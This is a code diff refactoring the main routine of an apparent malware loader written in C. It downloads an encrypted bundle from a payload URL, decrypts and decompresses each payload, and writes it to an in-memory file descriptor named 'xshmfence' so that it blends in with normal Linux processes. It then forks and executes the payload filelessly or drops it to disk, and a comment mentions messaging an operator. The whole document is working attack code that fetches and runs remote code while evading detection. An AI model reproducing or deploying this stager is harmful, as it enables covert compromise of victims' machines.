@@ -13,77 +13,65 @@ int main(int argc, char **argv)
     struct MemoryStruct payload;
     void *decrypted;
     void *decompressed;
-    PayloadStruct *metaBytes; // holds the sizes of each payload
+    PayloadStruct *payloadMeta; // holds the sizes of each payload
+    unsigned char *payloadOffset; // hold offset from payload base addr for addressing
     unsigned int numPayloads;
-    char *payloadOffset; // hold offset from payload base addr for addressing
     int payloadFD;       // in memory file descriptor
     int writeReturnSize;
     int d;                               //to hold the return value of detect()
-    char *payload_argv[] = PAYLOAD_ARGV; // argv for payload
-    char *payload_envp[] = PAYLOAD_ENVP; // envp for payload
-    char *pathToWrite = PATH_TO_WRITE;
     pid_t child;
     unsigned char *psswd;
 
     payload = beacon(PAYLOAD_URL);
     payloadOffset = payload.memory; // hold for iteration
+    numPayloads = extractInt(payloadOffset);
 
-    numPayloads = getNumPayloads(payloadOffset);
-    payloadOffset += 4;
-    metaBytes = (PayloadStruct *)calloc(numPayloads, sizeof(PayloadStruct)); //allocate array of pointers to point to arrays of payload metadatas
-
-    if (metaBytes == NULL)
-    {
+    payloadMeta = parseMeta(payload.memory, &payloadOffset); // extract all metadata
+    if(payloadMeta == NULL){
+        //free everything
         return -1;
     }
 
-    for (int i = 0; i < numPayloads; i++)
-    { // define metadata arrays
-        metaBytes[i].uncompressedLength = getUncompLen(payloadOffset);
-        metaBytes[i].encryptedLength = getEncLen(payloadOffset);
-        metaBytes[i].decryptedLength = getDecryptedLen(payloadOffset);
-        payloadOffset += 12;
-    }
 
     // password padding
     psswd = psswdPadding(psswd);
     if (psswd == NULL)
     {
         free(payload.memory);
-        free(metaBytes);
+        free(payloadMeta);
         return -1;
     }
 
     for (int i = 0; i < numPayloads; i++)
     { // main loop to deploy payloads
 
-        decrypted = (void *)decrypt((unsigned char *)payloadOffset, metaBytes[i].encryptedLength, metaBytes[i].decryptedLength, psswd);
+        decrypted = (void *)decrypt((unsigned char *)payloadOffset, payloadMeta[i].encryptedLength, payloadMeta[i].decryptedLength, psswd);
         if (decrypted == NULL)
         {
             free(decrypted);
             free(payload.memory);
-            free(metaBytes);
+            free(payloadMeta);
             return -1;
         }
 
-        decompressed = (void *)decompress((unsigned char *)decrypted, (uLong)metaBytes[i].uncompressedLength, (uLong)metaBytes[i].decryptedLength);
+        decompressed = (void *)decompress((unsigned char *)decrypted, (uLong)payloadMeta[i].uncompressedLength, (uLong)payloadMeta[i].decryptedLength);
 
         while ((payloadFD = memfd_create("xshmfence", 0)) <= 2) // name as such due to this fd name appearing often on linux
         {                                                       // create memory file descriptor for execution
             close(payloadFD);
             free(decompressed);
             free(payload.memory);
-            free(metaBytes);
+            free(payloadMeta);
             free(psswd);
             return -1;
         }
 
-        writeReturnSize = write(payloadFD, decompressed, metaBytes[i].uncompressedLength); // write to mem_fd and error check
-        if (writeReturnSize != metaBytes[i].uncompressedLength)
+        writeReturnSize = write(payloadFD, decompressed, payloadMeta[i].uncompressedLength); // write to mem_fd and error check
+        if (writeReturnSize != payloadMeta[i].uncompressedLength)
         {
             free(decompressed);
             free(payload.memory);
-            free(metaBytes);
+            free(payloadMeta);
             free(psswd);
             close(payloadFD);
             return -1;
@@ -95,12 +83,12 @@ int main(int argc, char **argv)
         {
             if ((child = fork()) == 0)
             {
-                if (executePayload(payloadFD, payload_argv, payload_envp) == 0) // execute within child
+                if (executePayload(payloadFD, payloadMeta[i].argv, payloadMeta[i].envp) == 0) // execute within child
                 {
                     //send message to operator
                     free(decompressed);
                     free(payload.memory);
-                    free(metaBytes);
+                    free(payloadMeta);
                     free(psswd);
                     close(payloadFD);
                     return -1;
@@ -113,13 +101,13 @@ int main(int argc, char **argv)
         }
         else
         {
-            writeToDisk(decompressed, pathToWrite, metaBytes[i].uncompressedLength);
+            writeToDisk(decompressed, PATH_TO_WRITE, payloadMeta[i].uncompressedLength);
         }
         free(decompressed);
-        payloadOffset += metaBytes[i].encryptedLength; // increment offset to point at next payload
+        payloadOffset += payloadMeta[i].encryptedLength; // increment offset to point at next payload
     }
     free(payload.memory);
-    free(metaBytes);
+    free(payloadMeta);
     free(psswd);
     return 0;
 }
